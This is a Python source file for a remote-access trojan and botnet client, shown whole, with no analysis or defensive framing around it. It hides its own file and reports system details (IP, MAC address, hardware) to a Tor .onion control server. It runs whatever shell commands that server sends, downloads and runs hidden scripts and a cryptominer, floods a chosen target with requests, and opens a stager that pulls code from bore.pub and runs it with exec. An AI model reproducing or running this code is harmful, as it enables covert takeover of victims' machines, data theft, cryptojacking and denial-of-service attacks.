import os
import requests
import ctypes
import socket
import time
import platform
import psutil
import subprocess
import uuid
import wmi
import concurrent.futures
import random
import threading
import zlib
import base64
import struct
import os
import sys


proxies = {
    'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
    'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
}

requests_session = requests.Session()
requests_session.proxies.update(proxies)

subprocess.Popen("attrib +h BN.pyw", shell=True) 
  
def METASPLOIT(): 
  
    actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
    actual_mac = ':'.join([actual_mac[e:e+2] for e in range(0, 12, 2)]) 
  
    previous_data = "" 
  
    while True:
     url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Metasploit.php'
     time.sleep(5)
     response = requests_session.get(url)

     if response.status_code == 200:
        data = response.text.strip()
        if data != previous_data:
            parts = data.strip().split('::')
            if len(parts) == 3:
                mac, option, target = parts
            elif len(parts) == 2:
                mac, option = parts
            elif len(parts) == 1:
                mac = parts[0]
                option = ""
            else:
                continue

            time.sleep(1)
            
            previous_data = data
            if mac == '':
                if option == "STOP":
                    os.system("cls")
                    def restart_program():
                        python = sys.executable
                        os.execl(python, python, *sys.argv)
                    restart_program()
                elif option == "STARTVBSBAT":
                    os.system("cls")
                    php_script_url = 'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
                    home_directory = os.path.expanduser("~")
                    web_page1_path = os.path.join(home_directory, "Script.bat")
                    vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")

                    for file_path in [web_page1_path, vbs_file_path]:
                        if os.path.exists(file_path):
                            os.remove(file_path)

                    url1 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Script.io"
                    url2 = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/VBSEX.io"

                    download_file(url1, web_page1_path)
                    download_file(url2, vbs_file_path)

                    if os.name == 'nt':
                        hide_files_windows([web_page1_path, vbs_file_path])
                    else:
                        hide_files_unix([web_page1_path, vbs_file_path])

                    if os.path.isfile(vbs_file_path):
                        subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
                elif option == "MINING":
                    os.system("cls")
                    url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Mining.exe"
                    download_file(url, web_page_path)
                    web_page_path = os.path.join(home_directory, "Mining.exe")
                    if os.path.isfile(web_page_path):
                        subprocess.Popen(['cscript.exe', web_page_path], shell=True)
                elif option == "DDOS":
                    os.system("cls")
                    import requests
                    import threading
                    requests_per_second = 100000
                    def send_requests():
                        try:
                           response = requests.get(target)
                           if response.status_code == 200:
                               pass
                        except Exception as e:
                               pass

                    threads = []
                    for _ in range(requests_per_second):
                        thread = threading.Thread(target=send_requests)
                        threads.append(thread)
                        thread.start()

                    for thread in threads:
                     thread.join()


            if mac == actual_mac:

                if option == "START":
                    os.system("cls")
                    def run_specific_code():
                        import socket, zlib, base64, struct, time, random

                        while True:
                            ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
                            random.shuffle(ports_to_try)

                            for port in ports_to_try:
                                try:
                                    s = socket.socket(2, socket.SOCK_STREAM)
                                    s.connect(('bore.pub', port))

                                    l = struct.unpack('>I', s.recv(4))[0]
                                    d = s.recv(1)
                                    while len(d) < l:
                                        d += s.recv(l - len(d))

                                    exec(zlib.decompress(base64.b64decode(d)), {'s': s})

                                except Exception as e:
                                    print(f"{e}")
                                finally:
                                    s.close()

                                if 's' in locals():
                                    break

                    specific_code_thread = threading.Thread(target=run_specific_code)
                    specific_code_thread.daemon = True
                    specific_code_thread.start()
                elif option == "STOP":
                    os.system("cls")
                    def restart_program():
                        python = sys.executable
                        os.execl(python, python, *sys.argv)
                    restart_program()
                else:
                    print("Invalid command:", option)
            else:
                print("MAC not provided or does not match. Cannot execute command.")
        else:
            print("No new data.")
    else:
        print("Failed to fetch data.")
    time.sleep(1)


specific_code_thread = threading.Thread(target=METASPLOIT)
specific_code_thread.daemon = True  
specific_code_thread.start()

previous_command = None
previous_files = {}

def clear_screen():
    if os.name == 'nt':
        ctypes.windll.kernel32.GetStdHandle(-11).ResizeScreenBuffer(1, 1)
        ctypes.windll.kernel32.GetStdHandle(-11).SetConsoleActiveScreenBuffer(
            ctypes.windll.kernel32.GetStdHandle(-10)
        )
    else:
        print("\033c", end="")

def send_data_to_url(url, data):
    try:
        response = requests.post(url, data=data)
        return f"Data sent to {url}: {response.text}"
    except Exception as e:
        return f"Error sending data to {url}: {str(e)}"

def download_file(url, save_path):
    try:
        response = requests_session.get(url)
        if response.status_code == 200:
            with open(save_path, "wb") as file:
                file.write(response.content)
            print(f"Downloaded and saved {url} to {save_path}")
        else:
            print(f"Failed to download {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error downloading {url}: {str(e)}")

def hide_files_windows(file_paths):
    try:
        for file_path in file_paths:
            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
    except Exception as e:
        print(f"Error hiding files on Windows: {str(e)}")

def hide_files_unix(file_paths):
    try:
        for file_path in file_paths:
            os.chmod(file_path, 0o400)  
    except Exception as e:
        print(f"Error hiding files on Unix-based system: {str(e)}")

def get_system_info():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
        computer = wmi.WMI()
        computer_info = computer.Win32_ComputerSystem()[0]
        os_info = computer.Win32_OperatingSystem()[0]
        proc_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]
        os_name = os_info.Name.encode('utf-8').split(b'|')[0]
        os_version = ' '.join([os_info.Version, os_info.BuildNumber])
        system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
        cpu = format(proc_info.Name)
        gpu = format(gpu_info.Name)
        System = platform.system()
        res = platform.release()
        mach = platform.machine()
        pros = platform.processor()
        ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        ip = requests.get('https://checkip.amazonaws.com').text.strip()
        hostname = socket.gethostname()
        
        data_to_send = {
            "DeviceID": f"{hostname}",
            "IP Address": f"{ip}",
            "System": f"{System} {res}",
            "Mac": f"{mac}",
            "Processor": f"{cpu}",
            "GPU": f"{gpu}",
            "Ram": f"{ram}",
            "Machine": f"{mach}",
        }
        proxies = {
    'http': 'socks5h://127.0.0.1:9150',
    'https': 'socks5h://127.0.0.1:9150'
}


# قم بتكوين requests لاستخدام البروكسي
        session = requests.Session()
        session.proxies = proxies

        url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Save.php"
        data = data_to_send
        response = session.post(url, data=data)
        print(response.text)

        return data_to_send

    except Exception as e:
        print(f"Error retrieving system information: {str(e)}")
        return None

while True:
    try:
        def receive_data():
            global previous_command, previous_files

            while True:
                php_script_url = f'http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Control.php'
                
                response = requests_session.get(php_script_url)
                data = response.text.strip()

                if data != "" and data != previous_command:
                    if '::' in data:
                        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
                        mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
                        received_mac, file_to_execute = data.split('::', 1)
                        if received_mac == mac:
                            if file_to_execute not in previous_files or (time.time() - previous_files[file_to_execute]) > 30:
                                subprocess.Popen(f"{file_to_execute}", shell=True)
                                previous_files[file_to_execute] = time.time()
                            else:
                                print(f"Skipping file execution: File executed within 30 seconds.")
                        else:
                            print(f"Received data with MAC address {received_mac} does not match the device's MAC address.")
                    else:
                        subprocess.Popen(f"{data}", shell=True)
                    
                    previous_command = data
                    break 

        previous_command = ""
        previous_files = {}

        receive_thread = threading.Thread(target=receive_data)
        receive_thread.start()

        time.sleep(1)  
          


        data_to_send = get_system_info()
        if data_to_send:
            php_urls = [""]

            with concurrent.futures.ThreadPoolExecutor() as executor:
                results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)

            for result in results:
                print()

    except Exception as e:
        print(f"Error: {str(e)}")
        time.sleep(1)
